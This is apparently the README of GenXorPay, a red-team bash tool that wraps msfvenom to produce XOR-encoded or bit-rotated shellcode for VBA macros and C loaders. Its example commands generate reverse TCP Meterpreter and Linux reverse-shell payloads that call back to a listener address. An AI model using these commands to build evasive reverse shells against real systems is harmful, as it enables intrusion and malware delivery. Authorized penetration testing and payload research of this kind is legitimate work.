# GenXorPay
(Generate XOR Payload) is a command-line tool built to simplify the creation of XOR-encoded shellcode using msfvenom, optimized for VBA macro delivery in offensive security engagements and red team operations. 

![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/language-bash-blue?style=flat-square)

---
### 🔥 Features
- ✅ Supports a wide range of **Meterpreter** and **Shell** payloads
- ✅ Auto-generates **XOR-encoded** or **bit-rotated** shellcode in C or VBA macro format
- ✅ Smart encoder prompting — skipped when XOR or rotation is used
- ✅ Saves raw `msfvenom` output and encoded buffers for reuse or analysis
- ✅ Optional **interactive clipboard mode** to copy payloads, shellcode, and MSF listener commands
- ✅ Detects and adjusts output types automatically (`.exe`, `.vba`, `.c`, `.elf`)
- ✅ Works across **Windows**, **Linux**, **macOS**, **Android**, **PHP**, **Java**, **Python**
- ✅ Includes built-in **bit-rotation encoding** with `--rotate`
- ✅ Suggested GCC compilation commands for Linux C payloads
- ✅ Debug logging support (`--debug`) for reproducibility

---
### 🔌 Clone the Repository

```bash
git clone https://github.com/Ninjarku/genxorpay.git
cd genxorpay
chmod +x genxorpay.sh

# To use copy to clipboard features you will need to install xclip if you have not already done so
sudo apt install xclip 
```

---
### 📦 Example Use

```bash
./genxorpay.sh -p 3 -lhost 192.168.1.100 -lport 4444 -o macro.vba -raw raw.vba -i
```

This will:
- Generate a **reverse TCP Meterpreter** payload
- XOR-encode the shellcode
- Write a macro to `macro.vba`
- Save the raw shellcode to `raw.vba`
- Enter interactive mode for copying payload elements to clipboard

----

### 🐧 Linux Payload with C Decoder
```bash
./genxorpay.sh -p 13 -lhost 192.168.1.100 -lport 4444 --arch x64 --platform linux --format c -key 0x41 -o xor.c
```
- Generate Linux x64 shell_reverse_tcp
- Applies XOR encoding
- Outputs a C file (xor.c) that decodes and executes the shellcode (You will still need to compile it to run)

----
### 🔁 Bit-Rotation Example (Instead of XOR)
```bash
./genxorpay.sh -p 13 -lhost 192.168.1.100 -lport 4444 --arch x64 --platform linux --format c --rotate 3 -o rotate.c
```
- Rotates shellcode left by 3 bits
- C file includes reverse decoder logic (right rotation by 3 bits)

----
### 🎯 Intended Use

`genxorpay` is designed for:
- **Red team operations**
- **Penetration testing**
- **Macro payload development**
- **Payload encoding research**

> ⚠️ **Ethical Use Only:** This tool is intended for use in environments where you have explicit permission. Unauthorized use is illegal and unethical.

# TODO
### (Future To-Do)
- Add --test mode to auto-run payload in sandbox
- Add optional --encode-only mode for custom shellcode
- Handle msfvenom failure with --debug output
- Add integrity check of output bytes (e.g., checksum)
- Include SHA256 of output payloads in log (For hash checks on AV)

### 🤝 Contributions
Contributions, ideas, and pull requests are welcome. Please file an issue if you discover a bug or want to propose a feature.

## 📎 Author

Made with ❤️ for security professionals by [Ninjarku](https://github.com/Ninjarku)
